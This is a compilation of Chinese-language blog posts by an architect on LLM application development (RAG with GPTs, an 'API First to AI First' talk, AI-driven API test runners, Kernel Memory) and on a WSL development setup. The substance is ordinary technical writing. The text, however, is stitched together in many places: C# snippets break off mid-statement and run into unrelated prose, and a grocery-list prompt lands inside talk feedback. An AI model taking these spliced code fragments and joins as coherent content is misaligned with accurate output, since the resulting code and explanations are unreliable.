LLM 應用開發，來到第三篇。這篇我想談談 LLM 應用程式處理資料的做法。在 LLM 帶來很好的語言理解能力後，這需求也延伸到資料處理 (資料庫) 的領域了。這些過程跟我過去理解的資料庫正規化等等技巧，完全是不同領域啊，為了補足這段空缺，前兩篇研究完 LLM 如何替你呼叫 API 完成任務後，這篇我想以同樣角度，研究讓 LLM 能幫你找出並應用你的 DATA 的作法了。在軟體開發的領域，行為跟資料同樣重要，一直都是開發人員關注的兩大主題。補完這篇，我覺的對整個 LLM 應用開發的版圖就完整了。

這次我拿我自己累積的文章為主的應用: “安德魯的部落格 GPTs” 來示範吧。我希望能藉著 AI 的力量，讓我的讀者們能更有效的運用 (我期待不只是閱讀) 我的文章，來解決各位開發設計上的問題。我的部落格，一直是我過去 20 年來不間斷持續維護的 side project, 我除了改善系統本身之外，也不斷地在累積文章內容，因此不論文件的質、量、儲存格式等等，我都有十足的掌控能力，拿來做這次的 PoC 再適合也不過。

0. Build < MemoryServerless >(); int count = 0 ; foreach ( var post in GetBlogPosts ( @"d:\CodeWork\columns.chicken-house.net\" )) { count ++; Console . 你會發現這已經跨過開發的工程問題，真正已經轉移到語意的定義問題了，我覺得這真的是一大進步，開發人員終於要面對的是使用者的需求，而不再是替使用者跟電腦之間做溝通的橋樑。

3-3, 從 “APP” 到 “AGENT” 的操作

最後，聊一下我這次的選擇，我選用 GPTs，而沒有第一時間自己開發 “ASK” 的 UI … 仔細想想，這兩個選擇不是只有 “哪個比較好” 的差別而已，想通了我才發現這是不同的目標跟策略下的對應作法。我用幾點來對照:

我是否需要 “對談式” 的介面?

Chat GPT, 畢竟是個 “Chat”, 先天就有上下文的處理。如果我自己的部落格要提供檢索的功能，第一件事應該是想: 我要用對談的方式? 還是問答的方式 (有個搜尋框，讓使用者在裡面填問題，就列出答案；每次問答之間是獨立的，沒有上下文關係) ?

如果是 Chat, 那麼在 Chat GPT 的基礎上來實作會容易得多 (就是我這次的做法)。雖然會有其他的限制，例如最明顯的是只有 Chat GPT Plus 訂閱用戶才能使用，大大降低了能使用的人數。不過，如果你要少量測試，取得先期的回饋，這道是個不錯的方式。

即使你要提供 “對談” 的介面，我也建議不要第一時間嘗試自己開發，上下文關係的處理要做到精緻其實也是要花功夫的。過濾太多上下文，關聯性就掉了，保留太多，費用就上去了 ( token 很貴啊啊啊… )。如果要自己做，至少也要用對的 API，例如 Open AI 的 Chat Completion API, 或是 Assistant API, 避免自己處理太多 “chat” 的細節…

再者，Chat GPT 有基本的個人 profile, 這些細節也許都能協助讓你的回答更貼近 user 的期待，這些都屬於 prompt engineering 微調的範圍內。其實你收集好這些資訊，下對 prompt，用同樣的 LLM ( GPT4 )，應該都能做到對等的效果。但是就看你要不要 (有沒有辦法) 收集到這些資訊啊! 這是平台化的威力，依附在某個平台，這些好處就是現成的。以我來說，只是個單純的部落格搜尋，應該沒有人想在我這邊留下 user profiles 吧..

我要誰來付擔 AI 推理的運算費用?

接下來這是比較現實的問題，AI 的推論費用 ( token 費用 ) 很貴，由誰來支付? 你選擇的做法，背後就決定了這題 …

如果你用 GPTs, 那麼就是依附在 Chat GPT 的平台上了。要使用 GPTs 的人都必須先有 Chat GPT plus 的訂閱才能使用。而這些使用者在使用你的 GPTs 時，除了呼叫你的 API，在你 API 後端的運算之外，其他 LLM 端的處理，都是使用者的訂閱費用來支付的。

差距有多大? 我用前面舉過的案例，如果我問了這問題:

“告訴我 microservice 架構下，多個服務之間如何維持資料一致性的作法?”

這句話，用 text-embedding-003 (large) 模型來向量化搜尋，大約 30 tokens 以內，費用只要 $0.0000039 USD (價格: $0.13 / 1M tokens)，還在合理範圍…

但是為了做到 RAG，要把向量搜尋檢索出來的 30 段文字都丟到 LLM 去彙整答案，大約要花掉 15000 input tokens, GPT4 的費用大約是 $0.15 USD … 而使用量的管控，Chat GPT 已經有做法了，每個人每 3hr 能問的額度是 40 次…

這一次查詢的費用，看看你想要哪一方負擔? 你的選擇就決定了費用的分攤方式…

如果時間再往後推三年，假設到時本地端的 LLM 已經成熟，你可以寫個 APP 直接用自身的運算能力時… 這時就演變成使用者要自己負擔設備的運算能力，以及電費了。這是第三個選項，由使用者端來決定 LLM 的模型，以及負擔 LLM 推論的算力。

我想要的是 APP 還是 AGENT 操作?

這題思考層面更大了，你想要的是網站的檢索功能? 還是獨立 APP? 還是是一個整合的 Agent ?

Chat GPT 目前還算是個 APP，不過我覺得他有在往 Agent 發展；Microsoft Copilot 目前跟 Chat GPT 差異不大，但是比起 Chat GPT，他更有本錢往 Agent 發展 ( Microsoft 掌握 Windows 的終端使用者，也掌握更多個資跟行為 )。

然而，大家別忘了最大宗的 Agent: Apple 的 Siri 與 Google 的 Assistant …, Microsoft 為了 AI PC，也端出了 AI Explorer, 看得出來他的野心，AI Agent 也開始要收所有個人資料跟行為了..

整合這些 Agent 的好處很明顯，如果他們都具備一樣的能力，由這些 Agent 來問問題，能做到更完善的個人化。就如同前面我舉例的 Chat GPT 可以設定 user profile 一樣。同樣的 user profile, 我猜 Apple / Google / Microsoft 應該能抓得比 Open AI 更精準吧?

Chat GPT 也在追趕這塊，光是你可以在正常的 Chat GPT 內用 @{GPTs} 的方式來叫你的 GPTs 回答，某種程度也在網整合方向靠攏了。未來的 roadmap 會做到甚麼地步我不清楚，不過現在沒人敢忽視 Open AI 的下一步吧? 請把它當成一個可敬的對手來看待..

不管從任何角度來看，都是提供檢索能力的 API，掛上某個成熟的平台，看來更為合理啊，目前我挑選的就是 GPTs, 只是因為需要訂閱，觸及人數大幅受限，我就把它當作個快速驗證的平台吧! 有餘力時我再來看看，如何更進一步的開放檢索能力，給更多的使用者使用…

4, 結論

前前後後聊了很多，這邊的總結，我就三篇的心得寫在一起吧。其實我做這些 PoC, 寫這些研究過程, 跟心得, 我背後的想法是:

AI 對我來說，已經是另一個世代了，而新的世代的資訊科學，基礎技能也應該往上翻一輪了。

我求學的那個年代，大家在談的是 “ 程式 = 資料結構 x 演算法 “；進階的抽象分析，大概就是物件導向分析 (OOP / OOA / OOD) 的層面。

後來加了很多部署環境跟維運的題目，CI / CD, Cloud Native, Public Cloud / SaaS / PaaS / IaaS 層面的知識。

現在，回歸到應用程式需要有智慧的話 (就是 LLM 應用程式開發)，整個基礎就往上提升，你開始要掌握圍繞在 LLM 周圍的各種知識了，從 prompt engineering, function calling, embedding, vector search 等等，都變成是必要的技能，要懂這些才有辦法設計這些 “智慧化” 的應用程式。

要在未來十年繼續擔任架構師，就必須靈活運用這些 “基礎” 知識才行，所以我現在寫的這些內容，都是我自己在惡補這些技能的路上。比起速成，比起你多快能用 AI 寫出一段 code, 或是用 AI 產生一張圖，對我來說，搞清楚背後的運作模式，想清楚那些地方能用到它，該怎麼用，有哪些替代方案可以選擇等等…，這些在 AI 世代做出正確技術選擇，正確組合這些威力強大的武器，對資深人員來說更為重要。

因為你的角色不應該是跟 AI “競賽” (如果你心裡想著一直是不要被取代，那就是競賽了)，因為時間不會站在你這邊，長期下來競賽結果一定是輸掉的 XDD，正確的站位，應該是你如果有了威力強大的武器 (AI) 或是部屬 (還是 AI)，你要讓它做什麼才能讓你發揮更大的價值，那才是重點。我是個架構師，我該思考的就是如何善用 AI，才會花了時間研究這些題目，同時也寫了這三篇文章。

這三個月 (剛好一季)，買了 Chat GPT plus 訂閱，用了 MVP 的一些資源，花了周末 & 下班時間，嘗試這些 PoC / Side Project，我覺得很值得。整理的這三篇文章，也希望對大家有幫助

最後再擺一次這三篇的連結，歡迎分享轉貼，也歡迎在底下留言給我回饋 :D
Source: 安德魯的部落格

**從 API First 到 AI First**
這篇的內容，是我在今年 DevOpsDays Taipei 2024 擔任 Keynoye 演講 + 時間不夠被我略過的部分寫下來的文章。延續 2022, 2023 談的 “API First”, 延伸到 AI 應用程式開發，正好銜接到我半年前在研究的 LLM App 時寫的三篇文章內容, 這次投稿就用了這標題 “從 API First 到 AI First” 來聊聊這內容。

各行各業的每個環節, 大家都在想怎麼善用 AI 與相關工具了, 不過開發人員把它當作服務或元件，用在自家的產品上的案例就少得多。我自己是軟體開發產業的人，我的角色是架構師，我看到的是: AI 是個強而有力的元件，只要掌握清楚它的特性，就有機會在你的應用程式好好的利用他，而這也是這半年間，我下班時間都在摸索的事情。我驗證過好幾種想法，在那段時間我的 ChatGPT plus 的額度每天都被我用光了，到現在也算是有點心得，於是就有了這個主題，也有了這場演講 & 這篇文章。

這整篇的心得，其實摘要起來只有一段話，就是:

未來 AI 充分運用在各個領域的年代，你現在的軟體開發基礎只會越來越重要。

要確保未來 AI 盛行的世代還保有競爭力，請把基礎的功夫做好。

現在的生成式 AI 可以補足很多瑣碎的事務，我身邊的人都是 developer，對我最有感的就是 AI 可以大幅縮短 coding 的時間。不過縮短的是 “寫那些我覺得很無趣的 code” 的時間，真正有趣，真正需要思考或設計的地方，目前 AI 還幫不上忙。對我而言，我倒是省掉了很多處理這些瑣事的精神，可以更專注在架構跟技術決策上。

這些體驗，我更確定了這篇文章我想傳達的兩個觀點:

當 coding 可以量產的時候, 會決勝的是抽象化設計的品質

(能否被高效率 reuse 才是關鍵, 一次性 / 客製化的 code, AI 會寫得比你快，比你好) 當 coding 速度不再是瓶頸的時候, 基礎建設與架構的設計決策會是關鍵

(你是否能有系統有效率的管控 AI 相關的基礎元件? 包含 CI / CD 的 pipeline? 對於 AI 最重要的數據與模型, 你知道該如何 DevOps 嗎?)

在我寫這篇文章的時候，正好看到這篇 貼文，驗證了我的觀點。感謝好心人給了中文的註釋，留言的討論也都是中文的, 我直接附上 連結

整串討論下來，我摘要我最有感的部分:

… 我認為一件非常重要的事是，你需要對你的應用程式架構有非常好的掌握，不僅是大局，還包括更具體的程式碼相關事項，如你處理數據獲取的設計模式等。如果你在這方面缺乏經驗（這是透過成為一個優秀的程式開發者獲得的），而只是使用 Claude，我認為程式庫通常會變得過於雜亂和複雜，導致日後難以進行修改。 … (略) … 首先，我有一個 Claude 專案，我會在其中上傳相關文件。最重要的文件是我稱之為「主要脈絡」的文件，我在這裡非常清楚地說明應用程式目前的功能以及下一個版本應該做什麼。我還指定了所有技術決策，以及為什麼選擇它們。我還解釋了我希望 Claude 遵循的更具體的程式碼設計模式（例如，如何保持伺服器狀態和客戶端狀態同步，有許多不同的方法可以做到這一點，但你肯定希望在整個應用程式中保持一致性）。我還在這裡有一個完整的數據庫架構文件，以及一些範例 API 端點。這些文件基本上總結了該專案到目前為止的所有內容。 … (略) … 我同意你的看法，你仍然需要做出架構決策。只是現在實際的實施部分變得如此快速。 …

看到這裡，認同我的觀點，那就繼續往下看吧! 本文正式開始 : )

1. Write your response in JSON using the following format: [ { "action": "add", "item": string, "quantity": string }, { "action": "delete", "item": string } ]

這次，不用自己寫 code 去替換字串了，直接下 user prompt (或是 GPTs 的正常對話輸入部分):

Mmm, remember to buy some butter and a pair of zucchinis. 這次拿到 4.7, 看到結果後鬆了一口氣, 本來我預期應該會更低, 因為今年共筆沒看到太多回饋，事後也沒看到太多心得感想，實在很難客觀的判定今年講的好不好，直到收到這封 email..

一樣，回饋總是有好有壞，但是都是大家給我的意見，應該都要接納才對，我就一次不刪的全文照貼了，也當作我明年準備的參考:

展示的影片若是可以字體更大，或是用ppt方式呈現會更好，明白講者有用說的來解釋，但因為會場過於龐大，有時其實會漏聽幾句，感覺就是少了些什麼

非常實用且對初學者友善，用了簡潔明瞭的方式說明，投影片中也附加豐富的註解，透過這些解釋可以解開心中的疑惑，讓聽眾更能進入狀況。

以我一個從業15年以上的軟體開發人員，真的感受很多，收益匪淺。 大師的觀點跟著墨相當獨特。

api first is a awesome solution for biz api, but how to make the api list, It’s a hard job for me maybe can merge ddd thinking that mix both for the full biz domain api list

內容講解的維度很高，可以從更高的視野看待 AI，強度也算很高！但時間不夠嗚嗚嗚

學到很多，對於AI應用在開發上的理解很具啟發，與API first的策略結合也深具巧思

聽完會覺得是從不同角度來思考ai 應用，在軟體開發中思考可以怎麼留位置給 ai

新的啟發，但還不能實際應用，未知錯誤難以控制

實際已運行的商業應用面可以增加

很特別的發掘角度，但實務應用還需努力

專業 實用 啟發

感謝大家在填滿意度分數的同時，還願意多敲幾個字留這些意見給我 : )

5-3, 來自 Mick Zhuang, 參加心得分享



// 網友 Mick 分享的參加心得, 來源

一樣是在文章貼出去後才發現的，我本來只是在納悶，怎麼今年 DevOpsDays 結束後都沒看到什麼心得分享… 就順手 Google 一下，結果就看到這篇 Mick 網友發表的參加心得,分享了他最喜歡的三個議程

很榮幸的, 我的這場 “從 API First 到 AI First” 也在其中 :D

當然會轉貼這篇不只是因為他選中我的場次 (咦?

更重要的原因是，他總結的重點，完全就是我當天想傳達的 (這篇總結得比我自己講的還好) 懶得看我落落長的文章，可以先看看他的參加心得。

我節錄他摘要我演講內容的片段:

在生成式 AI 湧現 後，可以用 AI 改善很多不同的流程，這個演講針對的是「把 AI 融入你的服務之中」。 過往要產生好用的使用者介面，往往仰賴的是設計師對產品價值及對使用者的了解，加上自己的經驗來設計介面，提供適合使用者的資訊內容與呈現方式。有了生成式 AI 的聊天介面後，透過大型語言模型對語意的理解，提供對話方式也成為一種新的使用者介面。 在這個演講，Andrew 主要使用的是 OpenAI ChatGPT 的 GPTs，利用 GPTs 背後能夠設定 Prompt 和 Function Calling 的功能，提供一個電商的聊天客服介面，在 投影片 裡面可以找得到他的 Demo 影片。 覺得蠻有洞見的是，他從兩年前的 API First 主題，強調好的 API 設計是提供商業價值與長遠的擴充性不可或缺的部分，到了這兩年生成式 AI 的大幅發展，他將其疊加在 API First 的概念上，好的 API 設定提供了符合商業價值的功能定義，而生成式 AI 是用大量通則資訊訓練而成的，所以如果你的 API 設計上越符合真實世界的行為，AI 就能用得更好。

文章在這邊: blog.mickzh.com/blog…
Source: 安德魯的部落格

**用 WSL + VSCode 重新打造 Linux 開發環境**
圖: DALL-E, 趕流行, 我讓 ChatGPT 搜尋我自己然後畫出來的形象圖..

TL;DR; 這篇只是心得文而已，記錄我把主要工作環境翻新成 WSL + VS code 的過程，跟背後追問題學到的冷知識..

–

因為越來越多東西需要在原生的 linux 環境下執行, 趁著更新 24H2，重灌 windows 的機會, 就一起認真的重整我的開發環境了。在 windows 下要以 linux 為主要的工作環境，用 WSL (windows subsystem for linux) 是首選，不過畢竟是跨 OS 的使用，也有不少障礙要排除。趁這次花了點時間研究作法，同時也惡補了一下 wsl 的相關背景知識，這才發現 Microsoft 對 WSL 下了不少功夫啊，背後藏了很多不錯的巧思。

在這篇，我會交代我的作法，同時我也會整理一下我找到的參考資訊，以及背後架構與限制。我最想解決的問題 (也是我的動機) 是這幾個:

我想拋開 docker desktop for windows:

太多我不必要的東西了, 授權的限制也是原因之一。其實我用的功能不多，改成直接在 linux 下執行 docker 還更單純，少了一堆束縛，跑起來也更輕鬆愉快 我想避開 docker 掛載 volume 的 IO 效能低落問題:

目前用法，在 windows 下執行 docker, 掛載 volumes 的 IO 效能很糟糕 (糟到用不下去) 我想在 docker 使用 GPU / CUDA 應用:

目前在 windows 下跑 CUDA 困難重重，我只是想爽快地跑 ollama 啊… 我想要把 AI 應用都搬到 docker 環境下去執行, 支援 GPU 的 docker / linux 環境是必要條件 我想建立一個 linux 為主, 能長期使用的通用工作環境:

並且能無縫的跟我慣用的 windows 環境整合在一起。常用的工具就那些，包含 visual studio code, git, dotnet 等，能高度整合 windows, 不需要花太多心思在兩套系統間的協作，認知負荷越低越好

花了一個禮拜的下班時間，我總算把我的工作環境打造好了。過程中也發現不少 Microsoft 藏在 WSL 裡面的黑科技。自 WSL2 推出以來，這幾年相關的整合也都成熟了，我就野人獻曝，分享一下我的整理心得。

1. T_T ),

一個影響是絕對的效能表現, 看的到在高負載隨機讀寫的情況下 (我模擬 DB 的應用)。現階段效能前段班的 TLC 打不贏 6 年前的 MLC.. 這關打通後，後面的其實都一樣，WSL 直接內建了。真正要裝在 WSL 內的應該是 Microsoft 替 /dev/dxg 寫的 driver, 而不是 GPU 原廠寫的 driver 啊

最後捕兩張圖: OpenGL, OpenCL 等套件, 是透過 mesa library 來實作的:

而 CUDA 的堆疊路徑有點差別, 直接從 DxCore 對應而來:

GUI 應用程式:

最後一個，直接在 WSL 上面執行有 GUI 的應用程式… 這件事 Microsoft 也打通了，只是我這次沒用到，不過為了主題完整，我依樣把我研究過相關的題目列一下吧，有興趣的自己在往下挖。這關卡打通了後，你可以直接在 WSL 內執行有 GUI 的相關應用程式，而 GUI 的部分，則會無縫的直接在 windows 下顯示出來。當年我還在念書的年代，用的是 x11, 你可以指定 x11-display, 決定你開啟的 x-windows 要顯示在哪個終端機 (那個終端機會看到畫面，也可以用那台終端機的鍵盤滑鼠)。基本上 WSLg 也是把這件事跟 windows 整合完成了。

之前看這相關主題時，關鍵字都是 WSLg, 現在好像沒特別再提 WSLg 這關鍵字了。直接看這篇: Run Linux GUI apps on the Windows Subsystem for Linux

Windows Subsystem for Linux (WSL) now supports running Linux GUI applications (X11 and Wayland) on Windows in a fully integrated desktop experience.

WSL 2 enables Linux GUI applications to feel native and natural to use on Windows.

Launch Linux apps from the Windows Start menu

Pin Linux apps to the Windows task bar

Use alt-tab to switch between Linux and Windows apps

Cut + Paste across Windows and Linux apps

You can now integrate both Windows and Linux applications into your workflow for a seamless desktop experience.

5, 心得

從 2014 Satya Nadella 接任 Microsoft CEO, 開始喊 “Microsoft Love Linux” 開始, 到現在 10 年了, 真心佩服他有辦法把 windows 生態系改造成現在這個樣子, windows 終究不是 linux, 但是兩個異質的作業系統, Microsoft 能 (願意) 整合到這種程度也是挺了不起的..

果然 Microsoft 要有愛才能做到這程度啊

當年寫的這篇: [架構師觀點] .NET 開發人員該如何看待 Open Source Solutions?，看起來預測的每件事情都逐步實現了。Visual Studio 已經可以直接編譯 & 測試 Linux APP 了，.NET 真的也擴展到 Linux 及 IoT 等領域, VS Code 已經是各平台的 IDE 首選了。而這篇講的工作環境整合，則是說明 windows 已經可以成為 linux 的開發環境了。

雖然還不及 MacOS 那樣的體驗，但是整合度夠高，效能跟體驗夠好，足以變成我日常的工作環境，這樣就夠了。
Source: 安德魯的部落格

**從 Intent 到 Assertion #1, 聊聊 Vibe Testing 實驗心得**
最近，起了一個小型的 Side Project, 想說先前研究 “安德魯小舖”，一年半以前就已經做的到用對話的方式讓 AI 替我執行對應的 API 的應用了，現在這些應用更成熟了 (每間大廠都在推各種 Agent 的解決方案..)，某天就突發奇想:

AI 都有自動執行 API 的能力了，那能不能拿來簡化工程師要寫 script 來做 API 自動化測試的任務?

會有這篇，當然是試出了一些成果了，就是我前幾天在 FB 發的這篇。這篇就是要聊聊 FB 沒辦法提及的實作過程心得，有興趣的請繼續往下看。在開始之前，複習一下我貼在 FB 的 貼文 :

最近起了一個 side project, 我在嘗試透過 AI 能否簡化 / 自動化 API 測試的需求? 結果可行，雖然只是個 PoC 的 side project, 還是挺令人興奮的 😃 我拿我之前為了 “安德魯小舖” 寫的購物車 API 當範例，用 ChatGPT 產了主要情境的正反測試案例 (共 15 個，只描述商業情境，沒有指定精確的 API 參數) 當作腳本，丟給我寫的 Test Runner, 結果不負眾望, Test Runner 順利地按照腳本呼叫了 API，也給了我完整的測試結果報告.. GetHttpClient ( true ), AuthCallback = ( request , cancel ) => { var api_context = APIExecutionContextPlugin . (之後的文章再補)。我列舉幾個:

5-1, API 必須按照領域來設計

這是另一個難題，如果你的 API 設計先天不良，通通都只有 CRUD 的話，那麼要控制什麼情況該更新怎樣的資料進 DB，則都必須由呼叫 API 的一方來決定，這種情況下 AI 的處理效果是很糟糕的 (因為光是能否正確 “寫入” 資料就大量依賴呼叫端了，AI 的不確定性會大幅影響測試的進行)。因為你的商業邏輯完全沒有封裝在 API 內，你測試案例的執行路徑會混亂發散到無法掌控的程度。

按照領域來設計 API 規格，這是我先前提過 “AI Ready” 的一環。如果你的 API 難以被 AI 理解，我也會建議，要嘛重新封裝一層，要嘛放棄，用其他能半自動的測試方式。使用 Function Calling 來驅動測試自動化是有門檻的，AI Ready 是很關鍵的一環。

當你有這樣的設計水準的時候，寫在 API 文件上的敘述，都會變成 AI 理解的 Prompt。你不需要花費太多心思，直接把文件到給 AI，它自然就能理解正常運作。

5-2, API 必須有精確的規格文件

去年，我在寫這篇文章: [架構師觀點] 開發人員該如何看待 AI 帶來的改變? 時，提到一個情境 (4.2):

因為，掛上 LLM 後的 API ( Plugins ), 呼叫你 API 的不再是其他開發者了, 會變成 AI 來呼叫你的 API。你已經無法 “預測” 或是 “約束” 對方該怎麼呼叫。

補充一下，AI 之所以能 “精準的” 決定該怎麼產生呼叫 API 所有的資訊 ( Uri, Headers, Payload … ) 的原因來自他有精確的規格 ( Swagger, OpenAPI Spec )。反過來說，如果你現在的 API 還給不出 “精準” 的 API Spec, 那麼我必須說, 你的情況還沒機會用 Test Runner 來跑 API test …

如果文件 ( swagger ) 是人工維護的行不行? 理論上可行，務實上我會建議你別幻想了。這是 “測試用途”，不是 “正式應用”，這代表你可能在開發階段就需要測試。如果你的規格文件都需要人工維護了，你會精準到 RD 改了一行 Code 你就改一版文件嗎? 如果你開發階段必須不斷的執行測試驗證結果，你有能力在每次測試前，也都顧好這些文件都精準的跟 API code 保持同步嗎? 做不到的話，自動化測試其實是替你製造更多麻煩，不是解決更多問題。

因此別想繞過這些基礎功夫了，能做到這樣都是 CICD + 自動產生 API Spec 文件才做得到了。你如果現在還做不到這點，我建議，先把資源花在提升這些工程的成熟度上面。成熟度夠再來思考這些自動化測試的問題，否則 AI 加速的不是你的生產力，而是加速你技術債的生成… (你因為 AI 加速開發，反而累垮這些過去在背後默默人工補文件的人)

5-3, API 必須標準化處理認證授權

這在所有系統的 API 來說都是重要的，為了確保你是 “對的人” 來呼叫 API，一定要有的驗證程序。我的 API 實作的認證機制是 OAuth2, 理論上是要跳出 UI 讓 “真人” 輸入帳密，取得 Access Token 後再交由 API 確認使用。

然而我思考了測試需求的情境，指定 “測試對象” 應該也是個常見的需求，因此我在 Test Runner 有特別寫了另一個 Plugins 來接受測試案例指定 user 的需求，而背後會自己附加通過認證後的 access token 給每個呼叫 AndrewShop API 的 Authorization Header.

你也許會想，我就開出 login 的 API, 同樣用 Function Calling 的機制讓 AI 在執行測試時自己登入… 這是個 “理想” 的好方法嗎? 如果這 API 也是你開發中的 API 之一，也需要被測試，這樣做我覺得沒有問題。但是大部分情況下，認證機制都不是你主要要測試的標的，你要測的是認證後的 API 行為，是否符合授權的行為?

類似問題，同時也存在其他 “環境因素”，例如目前的語系，幣別，時區等等，如果這些環境因素會影響你的 API 行為，這些也都有同樣的 patterns 要處理。這應該屬於 “測試環境控制” 的議題，而不是單純的把它當作測試步驟來處理。因此，我有特別設計一個 Plugins 專門來負責環境控制。當然，這環境控制我會盡可能跟 AI 脫鉤，我期待的是準備好正確環境後，再讓 AI 來發揮他的專長，幫我按照情境執行測試案例。

因此，最小化來看環境問題，我在這邊就只看 “API 認證機制” 就好了。要自動化測試 API 前，你的 API 應該要有 “統一” 的認證機制，並且這認證機制應該統一處理後再交給 AI 執行測試案例。你應該在整個 Test Runner 的開發上，就明確規範這件事情。

5-4, 你需要有系統的彙整所有的測試報告

產生的測試報告，是 markdown 格式，是給 “人” 來看的。實際上，當測試量大的時候，你需要一個機制收集所有的測試結果，再用統計或是警示的方式來回報測試狀況。

這時，用 json 的方式結構化的輸出測試報告，會遠比 markdown 還來的有效。我實際上有讓 AI 同時輸出兩種格式，效果還不錯，但是高度綁定我們內部的環境，我就沒特別貼出來說明了。不過，這些技巧，同樣我在三月份的直播有提及。有興趣的人可以參考 LLM API 如何做到 Structured Output ( 俗稱的 Json Mode + Json Schema 作法 )。我有提供 HTTP / OpenAI .NET SDK / Semantic Kernel 三種不同版本的程式碼給大家參考。

上面提到的技巧，有興趣的可以參考:

我貼實際貼上輸出的 Json 給大家參考就好，這是同樣測試報告的 Json 版本，用來系統整合用的 (Markdown 是給人看，好閱讀用的)。範例如下:

{ "name" : "TC-05 (非法上界)" , "result" : "test_fail" , "comments" : "AddItemToCart 未回傳 400，且購物車不為空" , "context" : { "shop" : "shop123" , "user" : { "access_token" : "732bbead3cc54ddf9554c8428c9c2852" , "user" : "andrew" }, "location" : { "id" : "zh-TW" , "time-zone" : "UTC+8" , "currency" : "TWD" } }, "steps" : [ { "api" : "CreateCart" , "request" : {}, "response" : { "id" : 57 , "lineItems" : [] }, "test-result" : "pass" , "test-comments" : "成功建立空購物車" }, { "api" : "GetProducts" , "request" : {}, "response" : [ { "id" : 1 , "name" : "18天台灣生啤酒 355ml" , "price" : 65 }, { "id" : 2 , "name" : "可口可樂® 350ml" , "price" : 18 }, { "id" : 3 , "name" : "御茶園 特撰冰釀綠茶 550ml" , "price" : 25 } ], "test-result" : "pass" , "test-comments" : "成功取得商品清單" }, { "api" : "AddItemToCart" , "request" : { "id" : 57 , "productId" : 2 , "qty" : 11 }, "response" : { "id" : 57 , "lineItems" :[ { "productId" : 2 , "qty" : 11 } ] }, "test-result" : "fail" , "test-comments" : "未回傳 400，實際加入 11 件" }, { "api" : "GetCart" , "request" : { "id" : 57 }, "response" : { "id" : 57 , "lineItems" :[ { "productId" : 2 , "qty" : 11 } ] }, "test-result" : "fail" , "test-comments" : "購物車內仍含商品，不為空" } ] }

5-5, 小結

這篇，算是我開始在思考各種 AI 的應用。如同我常常在講，AI 帶來很多可能性，不過身為開發者，我們存在的價值應該是把有用的技術包裝成軟體，讓更多人易於使用才對。這兩年 AI 帶來的衝擊，開發人員是第一波。因為 GitHub Copilot / Cursor 這類 AI 強化的生產力工具的出現，我覺得開發人員受到的改變是最強烈的。

也因為這樣，開發人員都在談這些工具有多厲害，卻很少人在談怎麼用這些技術開發更厲害的工具或產品給其他人使用? 因此我才把研究重心轉移在 “自己寫 code 呼叫 LLM API” 能創造的價值。從 2023/12 的安德魯小舖開始，我還挺慶幸我有選擇這個研究路線的。一路至今，我也從這路線開始掌握 LLM 的運用技巧了。說實在話，沒有這樣的經歷，我現在應該沒辦法生出 Test Runner 來解決 API 自動化測試的問題。

你會發現，一路看下來，我用了相當多我在直播中介紹的技巧。工程師只要能善用 Structure Output + Function Calling，加上夠好的思路能寫出合理的 Prompt，你有 coding 的能力會是大加分。我只用了這幾招，就能組合出我期待的 Test Runner，即使這是目前現成的工具還辦不到的功能。這些能力，在面對系統整合的時候特別有用。關鍵地方用對技巧，你會發現跨系統整合，出乎意料的簡單，而 Test Runner，就是典型的需要整合各系統 (文件、測試執行、測試管理) 的應用。

回到測試這件事，這篇文章，大概講了我想表達跟嘗試部分的 30% 左右，大家可以把這篇當作起點，後面的我在慢慢補完吧! 後面我打算再寫兩篇，分別聊聊測試案例怎麼展開 (這張圖的左半部)，以及我一直沒有談的規模化細節 (MCP，認證等等的設計)。

文章內提到的參考資料，我都蒐集到這清單內了。有興趣請參考 [參考資料]:
Source: 安德魯的部落格

**.NET RAG 神器 - Microsoft Kernel Memory 與 Semantic Kernel 整合應用**
今年三月, 跟保哥開了一場直播, 從 LLM 的基礎 ( OpenAI ChatCompletion API 開始 ), 談基本的 API 操作。使用方式從 HttpClient, 到 OpenAI .NET SDK, 再到 Microsoft Semantic Kernel, 示範了 Chat, Json Mode, 到 Function Calling 的操作, 最後示範了用 Microsoft Kernel Memory 這套服務來實作 RAG …

這次直播，我決定調整一下過去的做法: 先持續釋出片段資訊, 之後再整理成文章。對比過去我先整理文章再發表的習慣, 每次就要花上幾個禮拜… 現在的資訊更新速度實在太快了, 過去的步調已經跟不上變化了 (我有好幾篇文章躺在 draft branch, 結果寫一半就… 就不用寫了 XDD)。所以這次我在直播前一週, 每天在 Facebook PO 文介紹直播的八個主題… 而現在，這篇就是事後收整內容的文章。想要回顧或是查詢資料的就來這邊吧!

相關資源與連結

Day 0, Chat Completion API

這場所有範例，都來自 LLM 的 Chat Completion 操作。我不想所有同性質的 API 都示範一次 (反正都相容，或是同模式)，所以我就直接用 OpenAI 的 API 規格為準了。LLM 的 API 很 “單純”，主要就只有一個 Chat Completion API，這 API 的用途就是回答你的問題。只靠這個 API 就足以解決所有需要 AI 回答問題的需要，複雜度都不在 API 本身，而是在於你怎麼運用他來解決 (對應) 你的問題與需求。

因此，你該學習的是各種解題需要的 “設計案例” (你也可以說是 AI APP 的 Design Patterns)，在開始之前我們先來看最基本的使用方式…

Demo:

Simple Chat

第一個例子，我說明詳細一點，後面就貼 code 就不再多做說明了。從 http request / response 的角度來看, 整個 chat 的通訊模式就是:

把過去所有對話的紀錄 POST 過去 (包含你問的，跟 AI 回答的)，API 會回應下一段回答給你。如果你收到了還想再繼續問，就連同這次 API 的回答，跟你下一次的問題，再打包一次重新呼叫一次 Chat Completion API ..

我拿基本的案例示範，任何 AI chat 你起始了這樣的對話:

system: you are a tester, answer me what I ask you.

然後你問 AI:

user: Say: 'this is a test'.

實際上, 你可以延遲到真正要問 AI 時再打 API 就好。把兩句 message 標示清楚 role, 包成一包送出去:

POST https://api.openai.com/v1/chat/completions Content-Type: application/json Authorization: Bearer { "model": "gpt-4o-mini", "messages": [ { "role": "system", "content": "you are a tester, answer me what I ask you." }, { "role": "user", "content": "Say: 'this is a test'." } ], "temperature": 0.2 }

這就是基本型, 以區塊來說, chat completions api 大概就只有:

headers, 主要是 apikey 等建立通訊的必要資訊 model + parameters, 你調用的 model, 以及該 model 需要的參數 (最常見的就是 temperature 了) messages, 就是常見的 context window, 這次的案例就兩段 message + role (option) tools, 允許 AI 使用的 tools 列表 (包含定義) (option) response format, 指定 AI 回應的格式, 例如 json object, 或是指定 json schema

你會得到這樣的 response (header 我就略過了, 只留 body):

